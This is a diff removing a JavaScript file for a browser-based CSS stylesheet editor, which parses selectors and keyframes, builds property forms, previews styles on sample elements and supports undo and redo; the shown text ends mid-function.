@@ -1,1160 +1,1 @@
-
-var t0 = null;
-var selx = '';
-var versions = new Array();
-var vn = 0, N = 0;
-var xy = [0, 0];
-var keyframes = [];
-var comments = [];
-var kfcomments = [];
-var sel2sheet = [];
-var isframe = false;
-var numselects = 0;
-var currentsel = -1;
-var currentsel1 = -1;
-if (typeof (installname) == 'undefined')
-    var installname = "tealeaman";
-var oldstage = null;
-var states =
-        [
-            [1, 0, 0],
-            [1, 2, 0],
-            [2, 3, 2],
-            [0, 3, 2]
-        ];
-
-var charcode = function (c)
-{
-    if (c == '/')
-        return 0;
-    if (c == '*')
-        return 1;
-    return 2;
-}
-
-var output = function (state, e, code)
-{
-    var a = '';
-    if (state == 1 && code == 2)
-        a = '/';
-    if (state == 1 && code != 1
-            || state == 0 && code != 0)
-        a += e;
-    return a;
-}
-var incode = null;
-var filter = function (s, mark)
-{
-    var c;
-    var code;
-    var state = 0;
-    var a = '';
-    for (var j = 0; j < s.length; j++)
-    {
-        c = s.charAt(j);
-        code = charcode(c);
-
-        if (mark == false)
-            a += output(state, c, code);
-        else if (state == 1 && code != 1
-                || state == 0 && code != 0)
-            incode[j] = true;
-        else
-            incode[j] = false;
-        state = states[state][code];
-    }
-    return a;
-}
-
-
-
-function trim(x)
-{
-    var i = 0;
-    while (i < x.length && (x.charAt(i) == '\n' || x.charAt(i) == ' ' || x.charAt(i) == '\r'))
-        i++;
-    var j = x.length - 1;
-    if (i > j)
-        return '';
-    while (j > i && (x.charAt(j) == '\n' || x.charAt(j) == ' ' || x.charAt(j) == '\r'))
-        j--;
-    if (i >= j + 1)
-        return '';
-    return x.substring(i, j + 1);
-}
-function showhint(t, h)
-{
-    if (trim(t.value) == '')
-    {
-        t.value = h;
-        t.style.color = 'grey';
-        t.className = 'hint';
-        t.style.color = 'grey';
-    } else
-    {
-        t.className = 'enter';
-        t.style.color = 'red';
-    }
-}
-function hidehint(t, h)
-{
-    if (trim(t.value) == h)
-    {
-        t.value = '';
-    }
-    t.className = 'enter';
-    t.style.color = 'red';
-}
-var allpn = new Array();
-var sel;
-function makefield(ts)
-{
-    sel = "<div style=height:640px;overflow:show  id=t3><table cellspacing=0 cellpadding=4 border=1 style=border-collapse:collapse >";
-    var z = 0;
-
-    for (var i = 0; i < ts.length; i++)
-    {
-        ts[i] = trim(ts[i]);
-        var j = ts[i].indexOf(":");
-        if (j == -1)
-            continue;
-        var pn = ts[i].substring(0, j).replace(/ /g, '');
-        allpn[allpn.length] = pn;
-        var v = trim(ts[i].substring(j + 1));
-        if (v == '')
-            continue;
-        if (z % 2 == 0)
-            sel += "<tr>";
-        var y = trim(pn.replace(/\/.*/, ''));
-        //y = '<a href="https://www.w3schools.com/cssref/" target=w3school>' + y + '</a>';
-        sel += "<td align=left  onclick=explain('" + y + "')><nobr>" + y + "</nobr></td><td align=center style=\"background-color:white\">";
-        if (v.indexOf("e.g") == 0)
-        {
-            v = trim(v.replace(/["|']/g, '')).replace(/;$/, '').replace(/ \/ /g, "@1#");
-            var ll = 0;
-            var dl = '';
-            var hasmore = false;
-            if ((ll=v.indexOf('/'))>0)
-          {
-               hasmore = true;
-               var xs = v.substring(4).split(/\//);
-               dl = "<datalist id=dl" + i + ">";
-               for (var k1=0; k1 < xs.length; k1++)
-                   dl += '<option value="' + xs[k1].replace(/@1#/g,' / ') + '"/>';
-               dl += "</datalist>";
-            }
-            
-            v = v.replace(/@1#/g,' / ').replace(/\/.*$/,'');
-            var v1 = v.replace(/"/g, '\\"');
-            var v2 = v1.replace(/'/g, "\\'");
-            sel += "<input   onblur=\"showhint(this,'"
-                    + v2
-                    + "')\" onfocus=\"hidehint(this,'"
-                    + v2
-                    + "')\" class=hint style=\"width:150px;border:0px;background-color:white\" value=\""
-                    + v1
-                    + "\" name=\""
-                    + pn
-                    + "\" onchange=setprop() " + (hasmore?("list=dl" + i + " "):"") + ">" + dl;
-        } else
-        {
-            sel += "<select name=\"" + pn + "\" class=enter  style=\"width:153px;border:0px;background-color:white\" onchange=setprop()><option value=\"\"></option>";
-
-            if (v.replace(/[\-]?[0-9]+[ ]*\-[ ]*[\-]?[0-9]+[ ]*[a-z]*/, '') == '')
-            {
-                var low = parseInt(v.replace(/[ ]*\-[ ]*[\-]?[0-9]+[ ]*[a-z]*/, ''));
-                var hg = parseInt(v.replace(/[\-]?[0-9]+[ ]*\-[ ]*/, '').replace(/[ ]*[a-z]*/, ''));
-                var ut = v.replace(/[\-]?[0-9]+[ ]*\-[ ]*[\-]?[0-9]+[ ]*/, '').replace(/ /g, '');
-
-                var step = Math.ceil((hg - low) / 50.0);
-                while (low <= hg)
-                {
-                    sel += "<option value=\"" + low + ut + "\">" + low + ut + "</option>";
-                    low += step;
-                }
-            } else
-            {
-                var vs = v.split(/[ ]*\/[ ]*/);
-                for (j = 0; j < vs.length; j++)
-                {
-                    sel += "<option value=\"" + vs[j].replace(/"/g, '@@') + "\">" + vs[j] + "</option>";
-                }
-            }
-            sel += "</select>";
-        }
-        sel += "</td><td onclick=pind(this) width=20>&nbsp;</td>";
-        if (z % 2 == 1)
-            sel += "</tr>";
-        
-        z++;
-    }
-
-    v = 'property:value;'
-    var morestr = "<td ><a href=\"https://www.w3schools.com/cssref/\" target=w3school>More</a></td><td><input name=More size=25 onblur=\"showhint(this,'"
-            + v.replace(/'/g, "\\'").replace(/"/g, '\\"')
-            + "')\" onfocus=\"hidehint(this,'"
-            + v.replace(/'/g, "\\'").replace(/"/g, '\\"')
-            + "')\" class=hint style=\"width:150px\" value=\""
-            + v.replace(/"/g, '\\"')
-            + "\"   onchange=setprop();setcl(this) ></td><td onclick=pullall()  width=20 align=center>&bull;&bull;&bull;</td>";
-
-    if (z % 2 == 1)
-    {
-       return sel + morestr + "</tr></table></div>";  
-    } else
-    {
-       return  sel +  "<tr>" + morestr + "<td colspan=3></td></tr></table></div>";
-    }
-    
-}
-var fields = '';
-function setcl( t)
-{
-    if (t.value !='' && t.value.indexOf('e.g') != 0)
-        t.style.color = 'red';
-    else t.color = 'gery';
-}
-
-var thispagewidth = function()
-{
-    var wd = screen.width - 200;
-    if (typeof (self.innerWidth) != 'undefined')
-    {
-        wd = self.innerWidth;
-    }
-    else if (typeof document.documentElement != 'undefined'
-            && typeof document.documentElement.clientWidth !=
-            'undefined' && document.documentElement.clientWidth != 0)
-    {
-        wd = document.documentElement.clientWidth;
-    }
-    else
-    {
-        wd = document.getElementsByTagName('body')[0].clientWidth;
-    }
-    return wd;
-}
-
-var thispageheight = function()
-{
-    if (navigator.appName.indexOf('Explorer') > 0)
-    {
-        return (document.documentElement && document.documentElement.clientHeight) || window.innerHeight || self.innerHeight || document.body.clientHeight;
-    }
-    var het = screen.height;
-    if (typeof (self.innerHeight) != 'undefined')
-    {
-        het = self.innerHeight;
-    }
-    else if (typeof document.documentElement != 'undefined'
-            && typeof document.documentElement.clientWidth !=
-            'undefined' && document.documentElement.clientWidth != 0)
-    {
-        het = document.documentElement.clientHeight;
-    }
-    else
-    {
-        het = document.getElementsByTagName('body')[0].clientHeight;
-    }
-    return het;
-}
-
-onload = function ()
-{
-    textareatobesearch = document.f.codes;
-    var t1 = document.getElementById('t1');
-    fields = t1.rows[1].cells[0].innerHTML.replace(/<!../, '').replace(/..>$/, '');
-
-    t1.rows[1].cells[0].innerHTML = makefield(fields.split(/\n/));
-    if (opener != null && typeof (opener.helpsave) != 'undefined')
-    {
-
-    } else
-    {
-        document.f.filename.style.visibility = 'hidden';
-        //document.f.savebtn.style.visibility = 'hidden';
-        document.getElementById('t2').rows[0].cells[0].innerHTML = '';
-    }
-    let w = thispagewidth();
-    textareatobesearch.style.width = (w - 710) + 'px';
-    document.f.sheet.style.width = (w - 710) + 'px';
-    if (document.f.codes.value != '')
-        parsecss();
-    document.f.undobtn.disabled = true;
-    document.f.dobtn.disabled = true;
-    document.getElementById("t3").style.cssText = '' + document.getElementById("t3").style.cssText;
-    
-}
-var homestr = '<a href="../"><div><div><div style="float:left;background:radial-gradient(farthest-side at 70% 65%,#efeffd,#666660);width:54px;height:54px;border-radius:27px;alignment:center;text-align:center;vertical-align:middle;line-height:54px"><table cellspacing="0" width="24" style="transform:scale(1.5,1.5);margin:10px 0px 0px 13px" align="center"><tr height="6"><td colspan="7"></td></tr><tr height="10"><td colspan="7"><div style="width:0px;height:0px;border-left:12px solid transparent;border-bottom:10px #fff solid;border-right:12px solid transparent;"></div></td></tr><tr height="3"><td width="3" rowspan="2"></td><td width="5" style="background-color:#ffffff" rowspan="2"></td><td width="5" rowspan="2"></td><td width="4" style="background-color:#ffffff" rowspan="2"></td><td width="5"></td><td width="4" style="background-color:#ffffff" rowspan="2"></td><td width="3" rowspan="2"></td></tr><tr height="5"><td style="background-color:#ffffff" width="5"></td></tr><tr height="12"><td colspan="7"></td></tr></table></div></div></div></a>';
-
-onresize = function()
-{
-    textareatobesearch.style.width =   '100px';
-    document.f.sheet.style.width =  100 + 'px';
-    let w = thispagewidth();
-    textareatobesearch.style.width = (w - 710) + 'px';
-    textareatobesearch.style.width = (w - 710) + 'px';
-    document.f.sheet.style.width = (w - 710) + 'px';
-}
-function findPositionnoScrolling(oElement, win)
-{
-    if (win == null)
-        win = self;
-    if (oElement == null)
-        return [0, 0];
-    if (typeof (oElement.offsetParent) != 'undefined')
-    {
-        var ii = 0;
-        var originalElement = oElement;
-        for (var posY = 0, posX = 0; ii++ < 10 && oElement != null; oElement = oElement.offsetParent)
-        {
-            posY += oElement.offsetTop;
-            posX += oElement.offsetLeft;
-            if (oElement != originalElement && oElement != win.document.body && oElement != win.document.documentElement)
-            {
-                posY -= oElement.scrollTop;
-                posX -= oElement.scrollLeft;
-            }
-        }
-        return  [posX, posY];
-    } else
-    {
-        return  [oElement.x, oElement.y];
-    }
-}
-
-function settag(v)
-{
-    for (var i = 0; i < document.f.fortag.options.length; i++)
-    {
-        if (document.f.fortag.options[i].value == v)
-        {
-            document.f.fortag.selectedIndex = i;
-            return;
-        }
-    }
-    document.f.fortag.options[document.f.fortag.options.length] = new Option(v, v);
-    document.f.fortag.selectedIndex = document.f.fortag.options.length-1;
-}
-
-function setstage(v)
-{
-    for (var i = 0; i < document.f.stage.options.length; i++)
-    {
-        if (document.f.stage.options[i].value == v)
-        {
-            document.f.stage.selectedIndex = i;
-            return;
-        }
-    }
-    document.f.stage.options[document.f.stage.options.length] = new Option(v, v);
-    document.f.stage.selectedIndex = document.f.stage.options.length-1;
-}
-function parsecss()
-{
-   //updatecss();
-
-    var k = 0;
-    var t = document.f.codes.value;
-
-    incode = new Array(t.length);
-    filter(t, true);
-
-    var i, l = 0;
-    var s = document.f.fortag;
-    ns = s.options.length;
-    for (var i = ns - 1; i >= 1; i--)
-        s.options[i] = null;
-    s = document.f.stage;
-    ns = s.options.length;
-    for (var i = ns - 1; i >= 1; i--)
-        s.options[i] = null;
-    s = document.f.selector;
-    var ns = s.options.length;
-    for (var i = ns - 1; i >= 1; i--)
-        s.options[i] = null;
-    keyframes = [];
-    kfcomments = [];
-    comments = [];
-    sel2sheet = [];
-    while (true)
-    {
-        var k1 = k;
-        
-        var i = t.indexOf("{", k);
-       
-        if (i == -1)
-            break;
-        var sel = trim(filter(t.substring(k, i).replace(/\n/g, ''),false) );
-      
-        var comment = '';
-        for (k1 = k; k < i - 1; k++)
-            if (incode[k1] == false)
-                comment += t.charAt(k1);
-        comments[sel] = comment;
-        s.options[s.options.length] = new Option(sel, sel);
-        if (sel.indexOf('@keyframe') >= 0)
-        {
-            if (sel.indexOf('@keyframes') < 0)
-                alert('Do you mean ' + sel.replace(/keyframe/, 'keyframes'));
-            var store = [];
-            var j = i + 1, n, m, gm = i;
-            var cmt = [];
-            while ((n = t.indexOf("{", j)) > 0 && t.substring(j, n).indexOf('}') < 0 && (m = t.indexOf("}", n + 1)) > 0)
-            {
-                var stage = trim(filter(t.substring(j, n).replace(/\n/g, ''), false));
-                var comment = '';
-                for (var k1 = j + 1; k1 < n - 1; k1++)
-                    if (incode[k1] == false)
-                          comment += t.charAt(k1);
-                cmt[stage] = comment;
-                store[stage] = trim(t.substring(n + 1, m));
-                j = m + 1;
-                gm = m;
-            }
-            keyframes[sel] = store;
-            kfcomments[sel] = cmt;
-            i = gm;
-            l = t.indexOf("}", i + 1);
-        } else
-        {
-            l = t.indexOf("}", i + 1);
-            if (l > 0)
-                sel2sheet[sel] = t.substring(i + 1, l);
-            else
-                sel2sheet[sel] = '';
-        }
-
-
-        if (l > 0)
-            k = l + 1;
-        else
-            break;
-
-    }
-
-    if (l >= 0)
-    {
-        var sel = trim(t.substring(k));
-
-        if (sel != '')
-        {
-            s.options[s.options.length] = new Option(sel, sel);
-            document.f.codes.value = t.substring(0, k) + "\n" + sel + "\n{\n}";
-            if (sel.indexOf('@keyframes') >= 0)
-            {
-                keyframes[sel] = [];
-                kfcomments[sel] = null;
-                setstage('');
-            } else
-            {
-                sel2sheet[sel] = '';
-                settag('');
-            }
-        }
-    }
-    
-
-    if (numselects == s.options.length - 1)
-    {
-        if (currentsel > 0)  // rename
-        {
-            s.selectedIndex = currentsel;
-            getsel(s);
-        }
-    } else if (numselects == 0 && s.options.length > 1) //begiingn
-    {
-        s.selectedIndex = 1;
-        getsel(s);
-        s.selectedIndex = 1;
-        currentsel = 1;
-    } else if (numselects + 1 == s.options.length - 1) // just added one
-    {
-        s.selectedIndex = s.options.length - 1;
-        getsel(s);
-        s.selectedIndex = s.options.length - 1;
-        currentsel = s.options.length - 1;
-    }
-    numselects = s.options.length - 1;
-
-}
-var t0;
-
-function getsel1(sel)
-{
-    if (selx.indexOf('@keyframes') < 0) return;
-    var selvalue = sel.options[sel.selectedIndex].value;
-     
-    var store = keyframes[selx];
-    var clm = kfcomments[selx];
-    if (selvalue == 'New Stage')
-    {
-        var z = prompt('Name of New Stage');
-        setstage(z);
-        store[z] = '';
-        clm[z] = '';
-        keyframes[selx] = store;
-        document.f.sheet.value = '';
-        updatecss();
-        filltag();
-        fillsheet("");
-        vn = 0;
-        N = 1;
-        versions[0] = "";
-        document.f.undobtn.disabled = true;
-        document.f.dobtn.disabled = true;
-    } else
-    {
-        var ws = store[selvalue];
-        if (ws == null) ws = '';
-        if (ws!=null)
-        {
-        filltag();
-        updatecss();
-        fillsheet(ws);
-        document.f.sheet.value = ws;
-        vn = 0;
-        N = 1;
-        versions[0] = ws;
-        document.f.undobtn.disabled = true;
-        document.f.dobtn.disabled = true;
-        }
-    }
- 
-    oldstage = selvalue;
-}
-
-function getsel2(sel)
-{
-     sample(document.f.sheet.value);
-}
-
-
-function filltag()
-{
-    var tags = ['div', 'span', 'p', 'table', 'tr', 'td', 'ul', 'ol', 'li', 'select', 'input', 'textarea', 'a',
-        'iframe', 'body'];
-    for (var i = 0; i < tags.length; i++)
-        document.f.fortag.options[i] = new Option(tags[i], tags[i]);
-}
-
-
-var notshow = '';
-function fillsheet(sheet)
-{
-    for (var k = 0; k < document.f.elements.length; k++)
-    {
-        var e = document.f.elements[k];
-        if (oldone(e))
-            continue;
-        if (e.tagName.toLowerCase() == 'input')
-        {
-            var x = ("" + e.onblur);
-            var j = x.indexOf("showhint");
-            x = x.substring(j);
-            e.value = '';
-            x = x.replace(/showhint.this,/, "showhint(e,");
-            x = x.replace(/}/, "");
-        
-            eval(x);
-            e.className = 'hint';
-        } else
-            e.selectedIndex = 0;
-    }
-
-    var ss = sheet.split(/;/);
-    notshow = '';
-    for (i = 0; i < ss.length; i++)
-    {
-        var j = ss[i].indexOf(":");
-        if (j == -1)
-            continue;
-        var pn = trim(ss[i].substring(0, j).replace(/[ ]/g, ''));
-        var pv = trim(ss[i].substring(j + 1).replace("\n", " "));
-        
-        var hit = false;
-         
-        for (var k = 0; k < document.f.elements.length; k++)
-        {
-            var e = document.f.elements[k];
-            if (oldone(e))
-                continue;
-            
-            if (("/" + e.name.toLowerCase() + "/").indexOf("/" + pn.toLowerCase() + "/") >= 0)
-            {
-                hit = true;
-               
-                if (e.tagName.toLowerCase() == 'input')
-                {
-                    e.value = pv;
-                    e.className = 'enter';
-                    e.style.color = 'red'; 
-                } else
-                {
-                    for (var l = 0; l < e.options.length; l++)
-                    {
-                        if (e.options[l].value.toLowerCase().replace(/ /g, '').replace(/@@/g, '"') == pv.toLowerCase().replace(/ /g, ''))
-                            break;
-                    }
-                    if (l == e.options.length)
-                    {
-                        if (pv.charAt(0).replace(/[0-9]/, '') == '' && pv != 'inherit')
-                        {
-                            e.options[l] = new Option(pv, pv);
-                            e.selectedIndex = l;
-                        } else if (pv != 'inherit' && pv != 'bold')
-                        {
-                            error(pv + ' is an invalid value for ' + pn);
-                            e.selectedIndex = 0;
-                        }
-                    } else
-                    {
-                        e.selectedIndex = l;
-                    }
-                }
-            }
-
-        }
-        if (hit == false)
-            notshow += "\n" + ss[i].replace(/:/g, ":e.g. ");
-    }
-    if (notshow != '')
-    {
-        //These properties are not recognized<br>" + notshow);
-        //document.f.More.value = notshow;
-        fields += notshow;
-        var t1 = document.getElementById('t1');
-        t1.rows[1].cells[0].innerHTML = makefield(fields.split(/\n/));
-        notshow = '';
-        fillsheet(sheet);
-    } else
-    {
-        xy = findPositionnoScrolling(t0.rows[3].cells[0]);
-        sample(sheet);
-    }
-}
-
-
-function error(s)
-{
-    var d = document.createElement("div");
-    d.id = "err";
-    d.className = "errplain";
-    d.innerHTML = "<img src=/" + installname + "/image/icon/smalls01.png onclick=closeerr() style=\"float:left\">" + s;
-    document.body.appendChild(d);
-}
-
-function closeerr()
-{
-    var d = document.getElementById("err");
-    document.body.removeChild(d);
-}
-
-function adjust(sheet)
-{
-    if (sheet == null)
-        return '';
-    sheet = trim(sheet.replace(/\n/g, '').replace(/;[ ]+/g, ';').replace(/:[ ]+/g, ':'));
-    var i = -1;
-    while (i < sheet.length - 1)
-    {
-        i = sheet.indexOf("top:", i + 1);
-        if (i == -1)
-            break;
-        else
-        if (i == 0 || sheet.charAt(i - 1).replace(/[a-z]/, '') != '')
-        {
-            var n = parseInt(sheet.substring(i + 4).replace(/[^0-9].*/, ''));
-            sheet = sheet.substring(0, i + 4) + (n + xy[1]) + sheet.substring(i + 4).replace(/[0-9]+/, '');
-            break;
-        }
-    }
-    i = -1;
-    while (i < sheet.length - 1)
-    {
-        i = sheet.indexOf("left:", i + 1);
-        if (i == -1)
-            break;
-        else if (i == 0 || sheet.charAt(i - 1).replace(/[a-z]/, '') != '')
-        {
-            n = parseInt(sheet.substring(i + 5).replace(/[^0-9].*/, ''));
-            sheet = sheet.substring(0, i + 5) + (n + xy[0]) + sheet.substring(i + 5).replace(/[0-9]+/, '');
-        }
-    }
-    return sheet;
-}
-function oldone(e)
-{
-    return (e.name.toLowerCase() == 'codes'
-            || e.name.toLowerCase() == 'sheet'
-            || e.name.toLowerCase() == 'parsebtn'
-            || e.name.toLowerCase() == 'filename'
-            || e.name.toLowerCase() == 'dobtn'
-            || e.name.toLowerCase() == 'undobtn'
-            || e.name.toLowerCase() == 'savebtn'
-            || e.name.toLowerCase() == 'selector'
-            || e.name.toLowerCase() == 'chn'
-            || e.name.toLowerCase() == 'fortag');
-}
-function setprop()
-{
-    var sheet = '';
-    for (var k = 0; k < document.f.elements.length; k++)
-    {
-        var e = document.f.elements[k];
-        if (oldone(e))
-        {
-            continue;
-        }
-        var vl = '';
-        if (e.tagName.toLowerCase() == 'input')
-        {
-            vl = trim(e.value.replace(/[ ]+/, ' '));
-            if (vl.indexOf('e.g') == 0)
-            {
-                vl = '';
-            }
-            if (e.value == '') e.style.color = 'grey';
-        } else if (e.tagName.toLowerCase() == 'select')
-        {
-            if (e.selectedIndex != 0 && e.options[e.selectedIndex]!=null)
-            {
-                vl = e.options[e.selectedIndex].value.replace(/@@/g, '"');
-            }
-            else
-                e.style.color = 'grey';
-        }
-        if (vl == '')
-            continue;
-        var es = e.name.toLowerCase().split(/\//);
-        if (e.name == 'More')
-        {
-            if (vl.indexOf(":") > 0 && vl != 'property:value')
-                sheet += vl + ";\n";
-        } else
-            for (var i = 0; i < es.length; i++)
-                sheet += es[i] + ":" + vl + ";\n";
-    }
-    var t0 = document.getElementById('t0');
-    sheet = sheet.replace(/property:value;/, '').replace(/\n[ ]*$/, '').replace(/;[ ]*$/, '').replace(/\n[ ]*$/, '').replace(/;[ ]*$/, '');
-    sample(sheet);
-    document.f.sheet.value = sheet;
-    if (selx.indexOf("@keyframes") >= 0)
-    {
-        var store = keyframes[selx];
-        store[oldstage] = sheet;
-        keyframes[selx] = store;
-    } else
-    {
-        sel2sheet[selx] = sheet;
-    }
-    vn = N;
-    versions[N++] = sheet;
-    document.f.undobtn.disabled = false;
-}
-
-function undo()
-{
-    if (vn == 0)
-        reutrn;
-    vn--;
-    fillsheet(versions[vn]);
-    document.f.sheet.value = versions[vn];
-    if (selx.indexOf("@keyframes") >= 0)
-    {
-        var store = keyframes[selx];
-        store[oldstage] = versions[vn];
-        keyframes[selx] = store;
-    } else
-    {
-        sel2sheet[selx] = versions[vn];
-    }
-    document.f.dobtn.disabled = false;
-    if (vn == 0)
-    {
-        document.f.undobtn.disabled = true;
-    }
-}
-
-function goahead()
-{
-    if (vn == N - 1)
-        reutrn;
-    vn++;
-    fillsheet(versions[vn]);
-    document.f.sheet.value = versions[vn];
-    if (selx.indexOf("@keyframes") >= 0)
-    {
-        var store = keyframes[selx];
-        store[oldstage] = versions[vn];
-        keyframes[selx] = store;
-    } else
-    {
-        sel2sheet[selx] = versions[vn];
-    }
-    if (vn == N - 1)
-    {
-        document.f.dobtn.disabled = true;
-    }
-}
-var contents = 'contents';
-var sheet1;
-function changecontent()
-{
-    var td = document.getElementById('showarea');
-    td.innerHTML = "<textarea id=newcontent rows=10 cols=50>" + contents + "</textarea>";
-    document.getElementById('showarea').onclick = null;
-    document.f.chn.style.visibility = 'visible';
-    document.f.chn.className = 'button';
-    document.f.chn.value = 'Update';
-}
-function showhtml()
-{
-    if (document.getElementById('newcontent')!=null)
-    {
-        updatec();
-    }
-    else if (document.f.chn.value == 'Sample')
-    {
-        var dv = document.createElement('div');
-        dv.style.cssText = 'background-color:grey;position:absolute;left:100px;top:100px;z-index:10;border:1px grey outset;padding:1px';
-        var x = document.getElementById('showarea');
-        
-        dv.innerHTML='<table><tr><td  id=scl onclick=closesic(this)> <!----></td><td  id=sis>The HTML codes of the sample object below</td></tr><tr><td colspan=2><textarea rows=20 cols=60>' + document.getElementById('showarea').innerHTML.replace(/textarea/ ,"text'+'area") + '</textarea></td></tr></table>';
-        document.body.appendChild(dv);
-        document.f.chn.value = 'Sample';
-    }
-}
-function closesic(s)
-{
-    document.body.removeChild(s.parentNode.parentNode.parentNode.parentNode);
-}
-function updatec()
-{
-    contents = document.getElementById('newcontent').value;
-    sample(sheet1);
-    document.f.chn.value = 'Sample';
-    document.getElementById('showarea').onclick = changecontent;
-}
-function sample(sheet)
-{
-    sheet1 = sheet;
-    t0 = document.getElementById('t0');
-    filltag();
-    var k = document.f.fortag.selectedIndex; if (k==-1) k = 0;
-    var tag = document.f.fortag.options[k].value;
-    
-    if (tag == 'img')
-    {
-        t0.rows[3].cells[0].innerHTML = "<img style=\"" + adjust(sheet) + "\"  src=/" + installname + "/image/" + bgindexjpg + " width=200> ";
-    } else if (tag == 'p')
-    {
-        t0.rows[3].cells[0].innerHTML = "<p style=\"" + adjust(sheet) + "\" > " + contents + "</p>";
-    } else if (tag == 'span')
-    {
-        t0.rows[3].cells[0].innerHTML = "<span style=\"" + adjust(sheet) + "\"> " + contents + " </span>";
-    } else if (tag == 'table')
-    {
-        t0.rows[3].cells[0].innerHTML = "<table style=\"" + adjust(sheet) + "\" ><tr><td>" + contents + "</td><td>" + contents + "</td></tr><tr><td>" + contents + "</td><td>" + contents + "</td></tr></table>";
-    } else if (tag == 'tr')
-    {
-        t0.rows[3].cells[0].innerHTML = "<table ><tr style=\"" + adjust(sheet) + "\"><td>" + contents + "</td><td>" + contents + "</td></tr><tr><td>" + contents + "</td><td>" + contents + "</td></tr></table>";
-    } else if (tag == 'td')
-    {
-        t0.rows[3].cells[0].innerHTML = "<table ><tr ><td style=\"" + adjust(sheet) + "\">" + contents + "</td><td>" + contents + "</td></tr><tr><td>" + contents + "</td><td>" + contents + "</td></tr></table>";
-    } else if (tag == 'ol')
-    {
-        t0.rows[3].cells[0].innerHTML = "<ol style=\"" + adjust(sheet) + "\" ><li>" + contents + "</li><li>" + contents + "</li></ol>";
-    } else if (tag == 'ul')
-    {
-        t0.rows[3].cells[0].innerHTML = "<ul style=\"" + adjust(sheet) + "\" ><li>" + contents + "</li><li>" + contents + "</li></ul>";
-    } else if (tag == 'a')
-    {
-        t0.rows[3].cells[0].innerHTML = "<a style=\"" + adjust(sheet) + "\" href=\"http://www.yahoo.com\" target=_blank>http://www.yahoo.com </a>";
-    } else if (tag == 'h1' || tag == 'h2' || tag == 'h3' || tag == 'h4')
-    {
-        t0.rows[3].cells[0].innerHTML = "<" + tag + " style=\"" + adjust(sheet) + "\" ><li>" + contents + "</li><li>" + contents + "</li></" + tag + ">";
-    } else if (tag == 'input')
-    {
-        t0.rows[3].cells[0].innerHTML = "<" + tag + " style=\"" + adjust(sheet) + "\" value=\"" + contents + "\" >";
-    } else if (tag == 'select')
-    {
-        t0.rows[3].cells[0].innerHTML = "<" + tag + " style=\"" + adjust(sheet) + "\" ><option>" + contents + "</option></select>";
-    } else if (tag == 'textarea')
-    {
-        t0.rows[3].cells[0].innerHTML = "<" + tag + " style=\"" + adjust(sheet) + "\" rows=5 cols=20>" + contents + "</" + "textarea>";
-    } else
-    {
-        if (selx.charAt(0)=='#')
-        {
-           var did = selx.replace(/:.*/,'');
-           var str = '';
-           for (var key in sel2sheet)
-           {
-               if (key.indexOf(did)==0)
-                   str += key + '{' + sel2sheet[key] + '}'
-           }
-          t0.rows[3].cells[0].innerHTML = '<style>'+ str + "</style><div id=\"" + did.substring(1) + "\" >" + contents + "</div>";
-       }else if (selx.charAt(0)=='@')
-        {
-           var framenm = trim(selx.replace(/^[^ ]+[ ]+/,''));
-           var str = selx + '{' + framestr(selx) + "}"
-           t0.rows[3].cells[0].innerHTML = '<style>'+ str + "</style><div style=\"animation:" + framenm + " 2s 2\" >" + contents + "</div>";
-       }else
-          t0.rows[3].cells[0].innerHTML =   "<div style=\"" + adjust(sheet) + "\" >" + contents + "</div>";
-    }
-
-}
-
-function updatecss()
-{
-    if (selx == '')
-        return;
-    var k = 0;
-    var t = document.f.codes.value;
-    var i;
-    var str = '';
-    var s = document.f.selector;
-    for (i = 1; i < s.length; i++)
-    {
-        var sel = s.options[i].value;
-        var xx = comments[sel];
-        str += (xx==null?'':xx) + "\n";
-        str += sel + "\n{\n"
-        if (sel.indexOf('@keyframes') >= 0)
-        {
-            var y = '';
-            var store = keyframes[sel];
-            var mp = kfcomments[sel];
-            for (var key in store)
-            {
-                if (mp[key]!='')
-                   y += mp[key] + "\n";
-                y += key + "{" + store[key] + "}\n";
-            }
-            str += ident(y) ;
-        } 
-        else
-        {
-            str += ident(sel2sheet[sel]) ;
-        } 
-        str += "\n}\n";
-    }
-    document.f.codes.value = str;
-}
-function framestr(key)
-{
-    var y = '';
-    var store = keyframes[key];
-    for (var key in store)
-    {
-        y += key + "{" + store[key] + "}\n";
-    }
-    return y;
-}
-function combine(selx, oldstage, cod)
-{
-    // var y = document.f.fortag.options[document.f.fortag.selectedIndex].value;
-    var store = keyframes[selx];
-    var z = '';
-    for (var key in store)
-    {
-        if (key == oldstage && cod.replace(/[ |\n]/g, '') != '')
-        {
-            store[key] = cod;
-        }
-        z += key + '{' + store[key] + '}\n';
-    }
-    return z;
-}
-function ident(s)
-{
-    return "   " + trim(s).replace(/\n[ ]*/g, '\n   ');
-}
-
-function saveit()
-{
-    updatecss();
-    opener.helpsave(window, document.f.filename.value, document.f.codes.value);
-}
-
-function renull(fn, len, furl, ltime)
-{
-    var cl = document.f.savebtn.style.color;
-    document.f.savebtn.style.color = "#00CC00";
-    document.f.savebtn.style.color = cl;
-}
-
-function getsel(sel)
-{
-    if (sel == null || typeof (sel.tagName) == 'undefined' || sel.tagName.toLowerCase() != 'select' || sel.selectedIndex == -1)
-    {
-        return;
-    }
-    updatecss();
-    t0 = document.getElementById('t0');
-    selx = sel.options[sel.selectedIndex].value;
-    currentsel = sel.selectedIndex;
-    var ll = selx.indexOf(".");
-    var fortag = '';
-    for (var j = document.f.fortag.options.length - 1; j >= 0; j--)
-        document.f.fortag.options[j] = null;
-    if (selx.indexOf('@keyframes') >= 0)
-    {
-        document.getElementById('lblstage').style.visibility = 'visible';
-        document.f.stage.style.visibility = 'visible';
-        var store = keyframes[selx];
-        var key1 = null;
-        var str = '';
-        for (var key in store)
-        {
-            if (key1 == null)
-                key1 = key;
-            setstage(key);
-            if (oldstage != null && oldstage == key)
-                key1 = key;
-        }
-        setstage('New Stage');
-        setstage(key1);
-        document.f.sheet.value = store[key1];
-        fillsheet(store[key1]);
-        oldstage = key1;
-        vn = 0;
-        N = 1;
-        versions[0] = store[key1];
-        document.f.undobtn.disabled = true;
-        document.f.dobtn.disabled = true;
-        currentsel = sel.selectedIndex;
-        filltag();
-        return;
-    } else if (ll > 0)
-    {
-        fortag = selx.substring(0, ll);
-        document.getElementById('lblstage').style.visibility = 'hidden';
-        document.f.stage.style.visibility = 'hidden';
-        filltag();
-        settag(fortag);
-    } else
-    {
-        ll = selx.lastIndexOf(" ");
-        document.getElementById('lblstage').style.visibility = 'hidden';
-        document.f.stage.style.visibility = 'hidden';
-        filltag();
-        if (ll > 0)
-        {
-            fortag = selx.substring(ll + 1);
-        } else if (selx.replace(/[a-z]/g, '') == '')
-        {
-            fortag = selx;
-        }
-
-        settag(fortag);
-    }
-    var k = 0;
-    var t = document.f.codes.value;
-    var i;
